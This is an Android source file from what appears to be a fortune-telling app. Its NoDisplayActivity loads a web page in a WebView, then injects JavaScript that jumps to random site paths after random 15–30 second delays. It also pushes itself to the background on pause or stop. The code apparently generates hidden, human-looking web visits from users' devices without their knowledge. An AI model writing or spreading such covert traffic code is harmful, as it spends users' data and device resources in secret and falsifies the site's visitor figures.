package ir.website.faal141;

import android.app.Activity;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.webkit.ValueCallback;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class NoDisplayActivity extends Activity {
    static String urlStatic = "";
    WebView mWebView = null;
    static List<String> urls = new ArrayList();
    static int delay = 75000;
    static int min = 15000;
    static int limit = 2;
    static int count = 0;
    static int max = 30000;
    Handler handler;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            if (urls.size() == 0) {
                urls.add("/blog");
                urls.add("/search");
                urls.add("/category");
                urls.add("/package");
                urls.add("/page?page=10019");
            }
            handler = new Handler();
            setContentView(R.layout.activity_no_display);
            Log.d("NoDisplayActivity", "onstart............................................................" + NoDisplayActivity.urlStatic);
            mWebView = (WebView) findViewById(R.id.activity_nodisplay_webview);
//            NoDisplayActivity.mWebView = new WebView(getApplicationContext());

            mWebView.getSettings().setJavaScriptEnabled(true);
            mWebView.getSettings().setDomStorageEnabled(true);
            mWebView.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
            mWebView.getSettings().setCacheMode(WebSettings.LOAD_NO_CACHE);
            mWebView.loadUrl(NoDisplayActivity.urlStatic);
            mWebView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);

            NoDisplayActivity.urlStatic = "";
            mWebView.setWebViewClient(new WebViewClient() {
                @Override
                public void onPageFinished(WebView view, String url) {
                    Log.d("NoDisplayActivity", "onPageFinished.." + url);

                    if(count<limit) {
                        try {
                            mWebView.clearCache(true);
                            mWebView.clearView();
                            Random randomizer = new Random();
                            int mydelay = randomizer.nextInt(max - min + 1) + min;
                            String myurl = urls.get(randomizer.nextInt(urls.size()));
                            String jsscript = "setTimeout(function(){ window.location='" + myurl + "'; }," +
                                    String.valueOf(mydelay) + ");void(0);";
                            Log.d("NoDisplayActivity", String.valueOf(System.currentTimeMillis()));
                            Log.d("NoDisplayActivity", "randomizer.." + String.valueOf(mydelay) + myurl);
                            Log.d("NoDisplayActivity", jsscript);

                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT && false) {
                                view.evaluateJavascript(jsscript, new ValueCallback<String>() {
                                    @Override
                                    public void onReceiveValue(String s) {
                                        Log.d("NoDisplayActivity", s); // Prints: "this"
                                    }
                                });
                            } else {
                                mWebView.loadUrl("javascript:" + jsscript);
                            }
//
//                    Thread.sleep(20000);
//                    finish();
//
//                    Log.d("NoDisplayActivity", "onfinish............................................................");

                        } catch (Exception ex) {
                            Log.d("NoDisplayActivity", ex.getMessage());
                        }
                    }
                    else{
                        finish();
                    }
                    count++;
                }
                @Override
                public void onReceivedError(WebView view, int errorCode, String description, String failingUrl) {
                    try {
                        Log.d("NoDisplayActivity", description);
                        finish();

                    } catch (Exception ex) {
                        Log.d("NoDisplayActivity", ex.getMessage());
                    }
                }
            });
            Log.d("NoDisplayActivity", "postDelayed............................................................");
            Log.d("NoDisplayActivity", String.valueOf(System.currentTimeMillis()));
            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    Log.d("NoDisplayActivity", String.valueOf(System.currentTimeMillis()));
                    Log.d("NoDisplayActivity", "Runnable............................................................");
                    finish();
                }
            }, delay);
        } catch (Exception ex) {
            finish();
        }
    }
    @Override
    protected void onDestroy() {
        try {
            handler.removeCallbacksAndMessages(null);
        }catch (Exception ex) {
        }
        Log.d("NoDisplayActivity", "onDestroy............................................................");
        super.onDestroy();
        destroyWebView();
    }
    @Override
    protected void onResume() {
        super.onResume();
        Log.d("NoDisplayActivity", "onResume............................................................");
    }
    @Override
    protected void onStop() {
        moveTaskToBack(true);
        super.onStop();
        Log.d("NoDisplayActivity", "onStop............................................................");
    }
    @Override
    protected void onPause() {
        moveTaskToBack(true);
        super.onPause();
        Log.d("NoDisplayActivity", "onPause............................................................");
    }
    public void destroyWebView() {
        // Make sure you remove the WebView from its parent view before doing anything.
        try {
            //mWebView.clearHistory();
            // NOTE: clears RAM cache, if you pass true, it will also clear the disk cache.
            // Probably not a great idea to pass true if you have other WebViews still alive.
            //mWebView.clearCache(true);
            // Loading a blank page is optional, but will ensure that the WebView isn't doing anything when you destroy it.
            //mWebView.loadUrl("about:blank");
            //mWebView.onPause();
            //mWebView.removeAllViews();
            //mWebView.destroyDrawingCache();
            // NOTE: This pauses JavaScript execution for ALL WebViews,
            // do not use if you have other WebViews still alive.
            // If you create another WebView after calling this,
            // make sure to call mWebView.resumeTimers().
            //mWebView.pauseTimers();
            // NOTE: This can occasionally cause a segfault below API 17 (4.2)
            mWebView.destroy();
            // Null out the reference so that you don't end up re-using it.
            urlStatic = "";
//            mWebView = null;
            urls = new ArrayList();
            delay = 75000;
            min = 15000;
            max = 30000;
            limit = 2;
            count = 0;
            Log.d("NoDisplayActivity", "destroyWebView............................................................");
        } catch (Exception ex) {
        }
    }
}
